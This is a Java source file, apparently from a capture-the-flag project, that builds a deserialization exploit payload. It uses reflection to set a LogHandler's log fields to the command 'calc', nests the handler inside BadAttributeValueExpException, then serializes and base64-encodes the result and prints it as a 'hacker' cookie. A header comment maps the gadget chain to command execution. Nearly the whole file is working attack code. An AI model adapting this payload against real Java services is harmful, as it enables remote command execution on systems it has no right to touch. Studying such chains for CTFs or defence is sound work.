package com.summersec.shiroctf.Tools;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @ClassName: main
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/12/31 17:12
 * @Version: v1.0.0
 * @Description:
 *              Gadget：
 *                  Tools.base64Decode()
 *                      Tools.deserialize()
 *                          ObjectInputStream.readObject()
 *                              BadAttributeValueExpException.readObject()
 *                                  LogHandler.toSting()
 *                                      Tools.exeCmd()
 *
 **/
public class Payload {
    public static void main(String[] args) throws Throwable {
//        invoke();
//        ToString();
        Calc();
    }
    /**
     * @Description: invoke方法执行命令
     * @param
     *
     * @return:
     */
    public static void invoke() throws Throwable {
        LogHandler logHandler = new LogHandler();
        Field wirtelog = logHandler.getClass().getDeclaredField("writeLog");
        wirtelog.setAccessible(true);
        wirtelog.set(logHandler, "calc");
        Object ob = new Object();
        Method method = logHandler.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);
        Object[] obs = new Object[]{"asd","asd"};
        logHandler.invoke(ob,method,obs);
    }
    /**
     * @Description: toString 方法执行命令
     * @param
     *
     * @return:
     */
    public static void ToString() throws NoSuchFieldException, IllegalAccessException {
        LogHandler logHandler = new LogHandler();
        Field readlog = logHandler.getClass().getDeclaredField("readLog");
        readlog.setAccessible(true);
        readlog.set(logHandler, "calc");
        logHandler.toString();

    }
    /**
     * @Description: Gadget
     *
     * @param
     *
     * @return:
     */
    public static void Calc() throws Throwable {
        LogHandler logHandler = new LogHandler();
        Field readlog = logHandler.getClass().getDeclaredField("readLog");
        readlog.setAccessible(true);
        readlog.set(logHandler, "calc");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, logHandler);
        String datas = Tools.base64Encode(Tools.serialize(badAttributeValueExpException));
        System.out.println("Cookie: " + "hacker="+ datas);
//        Tools.deserialize(Tools.base64Decode(datas));

    }

}
